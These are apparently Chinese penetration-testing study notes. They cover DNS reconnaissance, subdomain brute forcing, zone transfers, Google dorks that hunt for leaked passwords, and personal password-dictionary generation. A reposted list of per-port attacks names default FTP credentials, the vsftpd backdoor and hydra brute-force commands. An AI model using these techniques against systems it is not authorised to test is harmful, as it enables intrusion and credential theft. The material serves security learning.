<h4 id="DNS查询"><a href="#DNS查询" class="headerlink" title="DNS查询"></a>DNS查询</h4><ol>
<li><p>域名记录</p>
<ol>
<li>A：主机地址(域名 -&gt; IP)</li>
<li>Cname：主机别名记录</li>
<li>NS：域名服务器记录</li>
<li>MX：邮件交换记录</li>
<li>PTR：反向解析（IP -&gt; 域名）</li>
</ol>
</li>
<li><p>DNS查找：</p>
<ol>
<li>浏览器缓存，浏览器会缓存DNS记录一段时间(2-30min)</li>
<li>系统缓存（gethostname）</li>
<li>路由器缓存</li>
<li>如果还是没有，那么就去检查ISP有没有吧</li>
<li>递归搜索</li>
<li>ISP的DNS服务器会从根域名开始进行递归查询</li>
</ol>
</li>
<li><p>递归查询：</p>
<p>主机向本地域名服务器的查询一般都是采用递归查询。</p>
<p>如果主机所询问的本地域名服务器不知道被查询的域名的IP地址，那么本地域名服务器就以DNS客户的身份，向其根域名服务器继续发出查询请求报文(即替主机继续查询)，而不是让主机自己进行下一步查询。因此，递归查询返回的查询结果或者是所要查询的IP地址，或者是返回一个失败的响应，表示无法查询到所需的IP地址。<br><img src="https://i.imgur.com/UBStYKq.jpg" alt="img"></p>
</li>
</ol>
<p>4.迭代查询：</p>
<p>本地域名服务器向根域名服务器的查询通常是采用迭代查询。</p>
<p>当根域名服务器收到本地域名服务器发出的迭代查询请求报文时，要么返回给本地域名服务器所要查询的IP地址，要么返回给本地域名服务器下一步应当查询的域名服务器的IP地址。</p>
<p>5.假设的主机想知道另一个主机（域名为 my.xxsilence.net)的IP地址。具体步骤如下：</p>
<ol>
<li>主机先向其本地域名服务器进行递归查询，如果缓存中没有，继续下一步</li>
<li>本地域名服务器采用迭代查询，先向一个根域名服务器查询。</li>
<li>根域名服务器告诉本地域名服务器，下一次查询的顶级域名服务器 dns.net。</li>
<li>本地域名服务器向顶级域名服务器 dns.net。</li>
<li>顶级域名服务器 dns.net，下一次应查询的权限域名服务器dns.xxsilence.net的IP地址。</li>
<li>本地域名服务器向权限域名服务器dns.xxsilence.net进行查询。</li>
<li>权限域名服务器dns.xxsilence.net告诉本地域名服务器，所查询的主机的IP地址。</li>
<li>本地域名服务器最后把查询结果告诉主机。</li>
</ol>
<h4 id="NSLOOKUP"><a href="#NSLOOKUP" class="headerlink" title="NSLOOKUP"></a>NSLOOKUP</h4><ol>
<li><p>type=a、mx、ns、any</p>
</li>
<li><p>或者使用 q 。（q = type）</p>
</li>
<li><p>组合使用</p>
<pre><code> nslookup -type=ns example.com 156.154.70.22</code></pre></li>
</ol>
<ul>
<li>主机解析 Cname（别名记录）</li>
</ul>
<pre><code> root@kali:~# nslookup </code></pre><ul>
<li>只查询 A 记录</li>
</ul>
<pre><code> &gt; set type=a
 &gt; www.sina.com</code></pre><p><img src="https://img-blog.csdnimg.cn/2019041316351316.png" alt="在这里插入图片描述"></p>
<ul>
<li>只查询 mx 记录</li>
</ul>
<pre><code> &gt; set type=mx
 &gt; sina.com</code></pre><pre><code> # 查邮件交换服务器的IP地址
 &gt; set type=a
 &gt; freemx1.sinamail.sina.com.cn
 &gt; freemx2.sinamail.sina.com.cn
 &gt; freemx3.sinamail.sina.com.cn.</code></pre><ul>
<li>查询域名服务器名称</li>
</ul>
<pre><code> &gt; set type=ns
 &gt; sina.com</code></pre><pre><code> # 查询域名服务器的IP地址
 &gt; set type=a
 &gt; ns1.sina.com.
 &gt; ns4.sina.com.
 &gt; ns3.sina.com.cn.
 &gt; ns4.sina.com.cn.
 &gt; ns1.sina.com.cn.</code></pre><ul>
<li>查询 PTR 记录</li>
</ul>
<pre><code> &gt; set type=ptr
 &gt; 202.108.3.242</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413163618774.png" alt="在这里插入图片描述"></p>
<ul>
<li><p>查询域名对应的多条 IP 记录<br>&gt; set type=a<br>&gt; <a href="http://mail3-242.sinamail.sina.com.cn/" target="_blank" rel="noopener">mail3-242.sinamail.sina.com.cn</a>.</p>
</li>
<li><p>设置指定域名服务器</p>
</li>
</ul>
<pre><code> # 指定域名服务器之后，两次结果不同
 &gt; server 8.8.8.8
 &gt; www.sina.com </code></pre><ul>
<li>指定 type 为 any</li>
</ul>
<pre><code> &gt; set type=any
 &gt; sina.com</code></pre><pre><code> text = &quot;v=spf1 include:spf.sinamail.sina.com.cn -all&quot;
 # spf 记录：反垃圾邮件记录
 # 在接收邮件的时候进行反向域名解析，查询比对这个记录，来确认是否是垃圾邮件</code></pre><ul>
<li>组合使用</li>
</ul>
<pre><code> # 默认使用 /etc/resolv.conf 文件的域名服务器
 root@kali:~# cat /etc/resolv.conf 
     domain localdomain
     search localdomain
     nameserver 10.10.10.2

 root@kali:~# nslookup -q=any 163.com
     Server:        10.10.10.2
     Address:    10.10.10.2#53

 # 指定域名服务器
 root@kali:~# nslookup -q=any 163.com 114.114.114.114</code></pre><h4 id="被动信息——dig"><a href="#被动信息——dig" class="headerlink" title="被动信息——dig"></a>被动信息——dig</h4><h5 id="1-DIG"><a href="#1-DIG" class="headerlink" title="1.DIG"></a>1.DIG</h5><ul>
<li>dig @8.8.8.8 <a href="http://www.sina.com/" target="_blank" rel="noopener">www.sina.com</a> mx</li>
<li>dig <a href="http://www.sina.com/" target="_blank" rel="noopener">www.sina.com</a> any</li>
<li>反向查询：dig +noall +answer -x 8.8.8.8</li>
<li>bind版本信息： dig +noall +answer txt chaos VERSION.BIND @ns3.dnsv4.com</li>
<li>DNS追踪： dig +trace <a href="http://example.com/" target="_blank" rel="noopener">example.com</a></li>
<li>抓包比较递归查询、迭代查询过程的区别</li>
</ul>
<p>1.默认使用 /etc/resplv.conf 指定的域名服务器</p>
<pre><code> root@kali:~# nslookup sina.com -type=any 8.8.8.8
     Server:        8.8.8.8
     Address:    8.8.8.8#53

     Non-authoritative answer:
     Name:    sina.com
     Address: 66.102.251.33

 #默认使用 /etc/resplv.conf 指定的域名服务器
 root@kali:~# dig sina.com any</code></pre><pre><code> # 指定域名服务器
 root@kali:~# dig sina.com any @8.8.8.8</code></pre><pre><code> # 尝试指定不同的域名服务器
 root@kali:~# dig sina.com any @202.106.2.20
 root@kali:~# dig sina.com any @114.114.114.114
 root@kali:~# dig sina.com any @8.8.8.8</code></pre><p>2.迭代别名记录查询</p>
<pre><code> # 修改默认域名服务器
 root@kali:~# cat /etc/resolv.conf 
     domain localdomain
     search localdomain
     nameserver 114.114.114.114

 root@kali:~# dig mail.163.com any</code></pre><p>3.一些参数</p>
<ul>
<li>+noall：不显示信息</li>
<li>+answer：显示结果</li>
</ul>
<pre><code>  root@kali:~# dig +noall +answer mail.163.com any
  mail.163.com.        131    IN    CNAME    mail163.ntes53.netease.com.
  root@kali:~# dig +noall +answer mail.163.com any | awk &#39;{print $5}&#39;</code></pre><p>4.反向查询</p>
<pre><code> root@kali:~# dig 163.com</code></pre><pre><code> # 反向查询 PTR记录
 root@kali:~# dig -x 123.58.180.8</code></pre><p>5.查询bind版本信息</p>
<pre><code> # 使用 dig 默认只会查询当前 fqdn 名称，不会查询所有的记录
 # dig 可以查询 bind 版本信息，根据 bind 漏洞，就可以全部获取 DNS 服务器权限
 root@kali:~# dig sina.com any</code></pre><pre><code> # 查询结果为空（被隐藏）
 root@kali:~# dig +noall +answer txt chaos VERSION.BIND @ns2.sina.com.
 VERSION.BIND.        0    CH    TXT    &quot;  &quot;</code></pre><p>6.DNS追踪</p>
<pre><code> # 跟踪过程：直接迭代查询，不经过本地缓存域名0服务器（从根域开始）

 root@kali:~# dig +trace 163.com</code></pre><pre><code> 抓包比较递归查询、迭代查询过程的区别</code></pre><p><img src="https://img-blog.csdnimg.cn/2019041316390245.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h4 id="2-区域传送"><a href="#2-区域传送" class="headerlink" title="2.区域传送"></a>2.区域传送</h4><p>1.区域传送：在本域的各个域名服务器之间进行信息同步</p>
<p>2.区域传送</p>
<pre><code> # dig @ns1.example.com example.com axfr

 root@kali:~# dig sina.com any</code></pre><pre><code> root@kali:~# dig @ns2.sina.com sina.com axfr</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413163913826.png" alt="在这里插入图片描述"></p>
<pre><code> # host -T -l sina.com 8.8.8.8

 root@kali:~# host -T -l sina.com ns2.sina.com.</code></pre><p><img src="https://img-blog.csdnimg.cn/20190413163922940.png" alt="在这里插入图片描述"></p>
<p>3.帮助文件</p>
<pre><code>root@kali:~# dig -h
Usage:  dig [@global-server] [domain] [q-type] [q-class] {q-opt}
            {global-d-opt} host [@local-server] {local-d-opt}
            [ host [@local-server] {local-d-opt} [...]]
Where:  domain      is in the Domain Name System
        q-class  is one of (in,hs,ch,...) [default: in]
        q-type   is one of (a,any,mx,ns,soa,hinfo,axfr,txt,...) [default:a]
                 (Use ixfr=version for type ixfr)
        q-opt    is one of:
                 -4                  (use IPv4 query transport only)
                 -6                  (use IPv6 query transport only)
                 -b address[#port]   (bind to source address/port)
                 -c class            (specify query class)
                 -f filename         (batch mode)
                 -i                  (use IP6.INT for IPv6 reverse lookups)
                 -k keyfile          (specify tsig key file)
                 -m                  (enable memory usage debugging)
                 -p port             (specify port number)
                 -q name             (specify query name)
                 -t type             (specify query type)
                 -u                  (display times in usec instead of msec)
                 -x dot-notation     (shortcut for reverse lookups)
                 -y [hmac:]name:key  (specify named base64 tsig key)
        d-opt    is of the form +keyword[=value], where keyword is:
                 +[no]aaflag         (Set AA flag in query (+[no]aaflag))
                 +[no]aaonly         (Set AA flag in query (+[no]aaflag))
                 +[no]additional     (Control display of additional section)
                 +[no]adflag         (Set AD flag in query (default on))
                 +[no]all            (Set or clear all display flags)
                 +[no]answer         (Control display of answer section)
                 +[no]authority      (Control display of authority section)
                 +[no]badcookie      (Retry BADCOOKIE responses)
                 +[no]besteffort     (Try to parse even illegal messages)
                 +bufsize=###        (Set EDNS0 Max UDP packet size)
                 +[no]cdflag         (Set checking disabled flag in query)
                 +[no]class          (Control display of class in records)
                 +[no]cmd            (Control display of command line)
                 +[no]comments       (Control display of comment lines)
                 +[no]cookie         (Add a COOKIE option to the request)
                 +[no]crypto         (Control display of cryptographic fields in records)
                 +[no]defname        (Use search list (+[no]search))
                 +[no]dnssec         (Request DNSSEC records)
                 +domain=###         (Set default domainname)
                 +[no]dscp[=###]     (Set the DSCP value to ### [0..63])
                 +[no]edns[=###]     (Set EDNS version) [0]
                 +ednsflags=###      (Set EDNS flag bits)
                 +[no]ednsnegotiation (Set EDNS version negotiation)
                 +ednsopt=###[:value] (Send specified EDNS option)
                 +noednsopt          (Clear list of +ednsopt options)
                 +[no]expire         (Request time to expire)
                 +[no]fail           (Don&#39;t try next server on SERVFAIL)
                 +[no]header-only    (Send query without a question section)
                 +[no]identify       (ID responders in short answers)
                 +[no]idnout         (convert IDN response)
                 +[no]ignore         (Don&#39;t revert to TCP for TC responses.)
                 +[no]keepopen       (Keep the TCP socket open between queries)
                 +[no]mapped         (Allow mapped IPv4 over IPv6)
                 +[no]multiline      (Print records in an expanded format)
                 +ndots=###          (Set search NDOTS value)
                 +[no]nsid           (Request Name Server ID)
                 +[no]nssearch       (Search all authoritative nameservers)
                 +[no]onesoa         (AXFR prints only one soa record)
                 +[no]opcode=###     (Set the opcode of the request)
                 +[no]qr             (Print question before sending)
                 +[no]question       (Control display of question section)
                 +[no]rdflag         (Recursive mode (+[no]recurse))
                 +[no]recurse        (Recursive mode (+[no]rdflag))
                 +retry=###          (Set number of UDP retries) [2]
                 +[no]rrcomments     (Control display of per-record comments)
                 +[no]search         (Set whether to use searchlist)
                 +[no]short          (Display nothing except short
                                      form of answer)
                 +[no]showsearch     (Search with intermediate results)
                 +[no]sigchase       (Chase DNSSEC signatures)
                 +[no]split=##       (Split hex/base64 fields into chunks)
                 +[no]stats          (Control display of statistics)
                 +subnet=addr        (Set edns-client-subnet option)
                 +[no]tcp            (TCP mode (+[no]vc))
                 +timeout=###        (Set query timeout) [5]
                 +[no]topdown        (Do +sigchase in top-down mode)
                 +[no]trace          (Trace delegation down from root [+dnssec])
                 +trusted-key=####   (Trusted Key to use with +sigchase)
                 +tries=###          (Set number of UDP attempts) [3]
                 +[no]ttlid          (Control display of ttls in records)
                 +[no]ttlunits       (Display TTLs in human-readable units)
                 +[no]unknownformat  (Print RDATA in RFC 3597 &quot;unknown&quot; format)
                 +[no]vc             (TCP mode (+[no]tcp))
                 +[no]zflag          (Set Z flag in query)
        global d-opts and servers (before host name) affect all queries.
        local d-opts and servers (after host name) affect only that lookup.
        -h                           (print help and exit)
        -v                           (print version and exit)


root@kali:~# host -h
host: illegal option -- h
Usage: host [-aCdilrTvVw] [-c class] [-N ndots] [-t type] [-W time]
    [-R number] [-m flag] hostname [server]
   -a is equivalent to -v -t ANY
   -c specifies query class for non-IN data
   -C compares SOA records on authoritative nameservers
   -d is equivalent to -v
   -i IP6.INT reverse lookups
   -l lists all hosts in a domain, using AXFR
   -m set memory debugging flag (trace|record|usage)
   -N changes the number of dots allowed before root lookup is done
   -r disables recursive processing
   -R specifies number of retries for UDP packets
   -s a SERVFAIL response should stop query
   -t specifies the query type
   -T enables TCP/IP mode
   -v enables verbose output
   -V print version number and exit
   -w specifies to wait forever for a reply
   -W specifies how long to wait for a reply
   -4 use IPv4 query transport only
   -6 use IPv6 query transport only</code></pre><h4 id="被动信息收集-DNS字典爆破"><a href="#被动信息收集-DNS字典爆破" class="headerlink" title="被动信息收集-DNS字典爆破"></a>被动信息收集-DNS字典爆破</h4><h5 id="1-DNS字典简介"><a href="#1-DNS字典简介" class="headerlink" title="1.DNS字典简介"></a>1.DNS字典简介</h5><pre><code>- fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist a.txt
- dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml
- dnsmap sina.com -w dns.txt
- dnsrecon -d sina.com --lifetime 10 -t brt -D dnsbig.txt
- dnsrecon -t std -d sina.com</code></pre><h5 id="2-fierce"><a href="#2-fierce" class="headerlink" title="2.fierce"></a>2.fierce</h5><pre><code>root@kali:~# dpkg -L fierce
    /usr/share/fierce/hosts.txt

root@kali:~# cp /usr/share/fierce/hosts.txt wordlist.txt -f
root@kali:~# fierce -dnsserver 8.8.8.8 -dns sina.com.cn -wordlist wordlist.txt</code></pre><h5 id="3-dnsenum"><a href="#3-dnsenum" class="headerlink" title="3.dnsenum"></a>3.dnsenum</h5><pre><code>root@kali:~# dpkg -L dnsenum
    /usr/share/dnsenum/dns.txt

root@kali:~# cp /usr/share/dnsenum/dns.txt dnsenum.txt 
root@kali:~# dnsenum -f dnsenum.txt -dnsserver 8.8.8.8 sina.com -o sina.xml</code></pre><h5 id="dnsmap"><a href="#dnsmap" class="headerlink" title="dnsmap"></a>dnsmap</h5><pre><code>root@kali:~# dpkg -L dnsmap
/usr/share/dnsmap/wordlist_TLAs.txt

root@kali:~# cp /usr/share/dnsmap/wordlist_TLAs.txt dnsmap.txt
root@kali:~# dnsmap sina.com -w dnsmap.txt </code></pre><h5 id="dnsrecon"><a href="#dnsrecon" class="headerlink" title="dnsrecon"></a>dnsrecon</h5><pre><code>root@kali:~# dpkg -L dnsrecon
/usr/share/dnsrecon/namelist.txt
root@kali:~# dnsrecon -d sina.com --lifetime 10 -t brt -D /usr/share/dnsrecon/namelist.txt
root@kali:~# dnsrecon -t std -d sina.com</code></pre><h5 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h5><p>1.在网页查询</p>
<p><img src="https://img-blog.csdnimg.cn/20190413164053891.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><a href="https://www.afrinic.net/" target="_blank" rel="noopener">https://www.afrinic.net/</a></p>
<p><a href="http://www.apnic.net/" target="_blank" rel="noopener">http://www.apnic.net/</a></p>
<p><a href="https://www.arin.net/" target="_blank" rel="noopener">https://www.arin.net</a></p>
<p><a href="https://www.iana.com/" target="_blank" rel="noopener">https://www.iana.com</a></p>
<p>2.使用</p>
<pre><code> root@kali:~# whois sina.com</code></pre><pre><code> root@kali:~# whois wooyun.org</code></pre><pre><code> root@kali:~# whois -h whois.apnic.net 192.0.43.10</code></pre><h3 id="二、搜索引擎"><a href="#二、搜索引擎" class="headerlink" title="二、搜索引擎"></a>二、搜索引擎</h3><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>公司新闻动态</li>
<li>重要雇员信息</li>
<li>机密文档/网络拓扑</li>
<li>用户名密码</li>
<li>目标系统软硬件技术架构</li>
</ul>
<h4 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN:"></a>SHODAN:</h4><h5 id="1-简介-1"><a href="#1-简介-1" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>搜索联网的设备</li>
<li>Banner：http、ftp、ssh、telnet</li>
<li>官网<ul>
<li><a href="https://www.shodan.io/" target="_blank" rel="noopener">https://www.shodan.io/</a></li>
</ul>
</li>
<li>查8.8.8.8</li>
</ul>
<p>常见filter：</p>
<ul>
<li>net</li>
</ul>
<pre><code>  net:8.8.8.0/24</code></pre><ul>
<li>city</li>
</ul>
<pre><code>  city:Beijing</code></pre><ul>
<li>country（CN、US）</li>
</ul>
<pre><code>  country:US</code></pre><ul>
<li>port（80、21、22、23）</li>
</ul>
<pre><code>  port:80</code></pre><ul>
<li>os</li>
</ul>
<pre><code>  os:linux</code></pre><ul>
<li>Hostname（主机或域名）</li>
</ul>
<pre><code>  hostname:www.baidu.com</code></pre><h4 id="GOOGLE搜索"><a href="#GOOGLE搜索" class="headerlink" title="GOOGLE搜索"></a>GOOGLE搜索</h4><h5 id="1-简介-2"><a href="#1-简介-2" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>inurl:“level/15/exec/-/show”</li>
<li>intitle:“netbotz appliance” “ok”</li>
<li>inurl /admin/login.php</li>
<li>inurl:qq.txt</li>
<li>filetype:xls “username | password“</li>
<li>inurl:ftp “password” filetype:xls site:baidu.com</li>
<li>Service.pwd</li>
<li><a href="http://exploit-db.com/google-dorks" target="_blank" rel="noopener">http://exploit-db.com/google-dorks</a></li>
</ul>
<h4 id="YANDEX"><a href="#YANDEX" class="headerlink" title="YANDEX"></a>YANDEX</h4><h5 id="1-简介-3"><a href="#1-简介-3" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>世界第四大搜索引擎——俄罗斯</li>
<li><a href="https://www.yandex.com/" target="_blank" rel="noopener">https://www.yandex.com/</a></li>
</ul>
<h4 id="查询用户信息"><a href="#查询用户信息" class="headerlink" title="查询用户信息"></a>查询用户信息</h4><p>1.邮件</p>
<pre><code> Usage: theharvester options 

    -d: Domain to search or company name
    -b: data source: google, googleCSE, bing, bingapi, pgp, linkedin,
                     google-profiles, jigsaw, twitter, googleplus, all

    -s: Start in result number X (default: 0)
    -v: Verify host name via dns resolution and search for virtual hosts
    -f: Save the results into an HTML and XML file (both)
    -n: Perform a DNS reverse query on all ranges discovered
    -c: Perform a DNS brute force for the domain name
    -t: Perform a DNS TLD expansion discovery
    -e: Use this DNS server
    -l: Limit the number of results to work with(bing goes from 50 to 50 results,
         google 100 to 100, and pgp doesn&#39;t use this option)
    -h: use SHODAN database to query discovered hosts

 Examples:
     theharvester -d microsoft.com -l 500 -b google -h myresults.html
     theharvester -d microsoft.com -b pgp
     theharvester -d microsoft -l 200 -b linkedin
     theharvester -d apple.com -b googleCSE -l 500 -s 300

 root@kali:~# theharvester -d microsoft.com -b pgp</code></pre><p>2.文件</p>
<ul>
<li>Usage: metagoofil options</li>
</ul>
<pre><code>      -d: domain to search
      -t: filetype to download (pdf,doc,xls,ppt,odp,ods,docx,xlsx,pptx)
      -l: limit of results to search (default 200)
      -h: work with documents in directory (use &quot;yes&quot; for local analysis)
      -n: limit of files to download
      -o: working directory (location to save downloaded files)
      -f: output file</code></pre><ul>
<li>Examples<ul>
<li>metagoofil -d <a href="http://apple.com/" target="_blank" rel="noopener">apple.com</a> -t doc,pdf -l 200 -n 50 -o applefiles -f results.html</li>
<li>metagoofil -h yes -o applefiles -f results.html (local dir analysis)</li>
</ul>
</li>
</ul>
<h4 id="CUPP制作个人专属字典"><a href="#CUPP制作个人专属字典" class="headerlink" title="CUPP制作个人专属字典"></a>CUPP制作个人专属字典</h4><h5 id="1-简介-4"><a href="#1-简介-4" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>按个人信息生成其专属的密码字典</li>
</ul>
<h5 id="2-安装"><a href="#2-安装" class="headerlink" title="2.安装"></a>2.安装</h5><pre><code> git clone https://github.com/Mebus/cupp.git
 python cupp.py -i</code></pre><h4 id="图片信息"><a href="#图片信息" class="headerlink" title="图片信息"></a>图片信息</h4><p>1.exif (linux)</p>
<pre><code> 用法: exif [选项...] 文件
   -v, --version                   显示软件版本
   -i, --ids                       显示 IDs，以代替信息标识名称
   -t, --tag=信息标识                  选择信息标识
       --ifd=IFD                   选择 IFD
   -l, --list-tags                 列出所有 EXIF 信息标识
   -|, --show-mnote                显示 MakerNote 的内容
       --remove                    删除信息标识或是 ifd
   -s, --show-description          显示信息标识说明
   -e, --extract-thumbnail         解出缩略图
   -r, --remove-thumbnail          删除缩略图
   -n, --insert-thumbnail=FILE     将 FILE 作为缩略图插入
       --no-fixup                  不修复文件中存在的标识信息
   -o, --output=FILE               将数据写入 FILE
       --set-value=STRING          tag 值
   -c, --create-exif               如果 EXIF 数据不存在就创建它
   -m, --machine-readable          以机器可读的格式(tab 分隔)输出
   -w, --width=宽度                  输出宽度
   -x, --xml-output                以 XML 格式输出
   -d, --debug                     显示调示信息

 帮助选项：
   -?, --help                      显示此帮助信息
       --usage                     显示简短的使用信息</code></pre>]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>信息收集</tag>
      </tags>
  </entry>
  <entry>
    <title>端口渗透总结</title>
    <url>/2020/03/12/duan-kou-shen-tou-zong-jie/</url>
    <content><![CDATA[<p><strong>转载自：</strong><a href="https://www.shangmayuan.com/a/5536cbdf4f7b417da40a35fa.html" target="_blank" rel="noopener">https://www.shangmayuan.com/a/5536cbdf4f7b417da40a35fa.html</a></p>
<h2 id="端口渗透总结"><a href="#端口渗透总结" class="headerlink" title="端口渗透总结"></a>端口渗透总结</h2><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>口渗透过程中我们需要关注几个问题：</p>
<p>1、 端口的banner信息</p>
<p>2、 端口上运行的服务</p>
<p>3、 常见应用的默认端口</p>
<p>当然对于上面这些信息的获取，我们有各式各样的方法，最为常见的应该就是nmap了吧！我们也可以结合其他的端口扫描工具，比如专门的3389、1433等等的端口扫描工具；</p>
<h4 id="服务默认端口"><a href="#服务默认端口" class="headerlink" title="服务默认端口"></a>服务默认端口</h4><p>公认端口(Well Known Ports)：0-1023，他们紧密绑定了一些服务；</p>
<p>注册端口(Registered Ports)：1024-49151，他们松散的绑定了一些服务；</p>
<p>动态/私有：49152-65535，不为服务分配这些端口；</p>
<p>当然这些端口都可以通过修改来达到欺骗攻击者的目的，但是这就安全了吗？攻击者又可以使用什么攻击方式来攻击这些端口呢？</p>
<p>还需要注明的一点是：很多木马工具也有特定的端口</p>
<h3 id="文件共享服务端口渗透"><a href="#文件共享服务端口渗透" class="headerlink" title="文件共享服务端口渗透"></a>文件共享服务端口渗透</h3><h5 id="ftp服务"><a href="#ftp服务" class="headerlink" title="ftp服务"></a>ftp服务</h5><p>FTP服务：ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；</p>
<p>默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议）</p>
<p>攻击方式：</p>
<p>爆破：ftp的爆破工具有很多，这里我推荐owasp的<a href="https://sourceforge.net/projects/worawita/" target="_blank" rel="noopener">Bruter</a> 以及msf中ftp爆破模块；</p>
<p>匿名访问：用户名：anonymous 密码：为空或任意邮箱</p>
<p>用户名：FTP      密码：FTP或为空</p>
<p>用户名：USET     密码：pass</p>
<p>当然还有不需要用户名密码直接访问的，一般出现在局域网中；</p>
<p>嗅探：ftp使用明文传输技术（但是嗅探给予局域网并需要欺骗或监听网关）</p>
<p>后门技术：在linux的vsftp某一版本中，存在着一个后门程序，只要在用户名后面加上 就会在6200上打开一个监听Shell，我们可以使用telnet直接连接；详细<a href="http://www.freebuf.com/articles/system/34571.html" target="_blank" rel="noopener">请点击</a></p>
<p>远程溢出漏洞：6.10.1 IIS FTP远程溢出漏洞，在IIS FTP服务器中NLST命令存在一个缓冲区溢出漏洞，这个漏洞可能是攻击者在服务器运行一条非法命令。</p>
<p>跳转攻击：（Bounce Attacks）攻击者发送一个FTP”PORT”命令给目标FTP服务器，其中包含该主机的网络地址和被攻击的服务的端口号。这样，客户端就能命令FTP服务器发一个文件给被攻击的服务。这个文件可能包括根被攻击的服务有关的命令（如SMTP,NNTP等）。由于是命令第三方去连接到一种服务，而不是直接连接，就使得跟踪攻击者变得困难，并且还避开了基于网络地址的访问限制。</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0116499" target="_blank" rel="noopener">山东电信Serv-U Web客户端弱口令</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0102552" target="_blank" rel="noopener">长虹ftp弱口令导致全网数据泄漏</a></p>
<h5 id="NFS服务"><a href="#NFS服务" class="headerlink" title="NFS服务"></a>NFS服务</h5><p>nfs：网络文件系统，允许网络中的计算机通过TCP/IP网络共享资源。基于Linux系统，配置方面很简单，详细配置请参考案例分享。在nfs配置中，有不做任何限制的，有限制用户，有限制IP，以及在版本2.x中我们还可以使用证书来验证用户。当然不同的限制可以采用的攻击方式也不一样；就目前而言网上关于nfs的攻击还是比较少的!</p>
<p>默认端口：2049</p>
<p>攻击方式：</p>
<p>未授权访问：未限制IP以及用户权限设置错误</p>
<p>案例分享：</p>
<p><a href="http://drops.wooyun.org/tips/8659" target="_blank" rel="noopener">Nfs配置不当导致被入侵</a></p>
<p><a href="http://www.360doc.com/content/11/0410/14/2054285_108598426.shtml" target="_blank" rel="noopener">NFS服务全攻略</a></p>
<h5 id="Samba服务"><a href="#Samba服务" class="headerlink" title="Samba服务"></a>Samba服务</h5><p>Samba服务：对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。</p>
<p>默认端口：137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务）</p>
<p>攻击方式：</p>
<p>爆破：弱口令（爆破工具采用hydra）hydra -l username -P<br>PassFile IP smb</p>
<p>未授权访问：给予public用户高权限</p>
<p>远程代码执行漏洞：CVE-2015-0240等等</p>
<p>案例分享：</p>
<p><a href="http://www.secpulse.com/archives/5975.html" target="_blank" rel="noopener">Samba远程代码执行漏洞</a></p>
<p><a href="http://tech.soft6.com/667/10/45861.html" target="_blank" rel="noopener">未授权访问文件系统漏洞</a></p>
<h5 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h5><p>ldap：轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。</p>
<p>默认端口：389</p>
<p>攻击方式：</p>
<p>注入攻击：盲注</p>
<p>未授权访问：</p>
<p>爆破：弱口令</p>
<p>案例分享：</p>
<p><a href="http://drops.wooyun.org/tips/967" target="_blank" rel="noopener">LDAP注入与防御剖析</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-051234" target="_blank" rel="noopener">欧朋LDAP服务匿名访问</a></p>
<p><a href="http://drops.wooyun.org/pentesting/2125" target="_blank" rel="noopener">使用LDAP查询快速提升域权限</a></p>
<h4 id="远程连接服务端口渗透"><a href="#远程连接服务端口渗透" class="headerlink" title="远程连接服务端口渗透"></a>远程连接服务端口渗透</h4><h5 id="SSH服务"><a href="#SSH服务" class="headerlink" title="SSH服务"></a>SSH服务</h5><p>SSH服务：这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。</p>
<p>默认端口：22</p>
<p>攻击方式</p>
<p>爆破：弱口令、</p>
<p>漏洞：28退格漏洞、OpenSSL漏洞</p>
<p>案例分享：</p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2015-0135530" target="_blank" rel="noopener">安宇创新科技ssh弱口令</a></p>
<p><a href="http://www.wooyun.org/bugs/wooyun-2010-0154829" target="_blank" rel="noopener">宜信贷某站存在OpenSSL漏洞</a></p>
<h5 id="Telnet服务"><a href="#Telnet服务" class="headerlink" title="Telnet服务"></a>Telnet服务</h5><p>Telnet服务：在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；</p>
<p>默认端口：23</p>
<p>攻击方式</p>
<p>爆破：弱口令</p>
<p>嗅探：此种情况一般发生在局域网；</p>
<p>案例分享：</p>
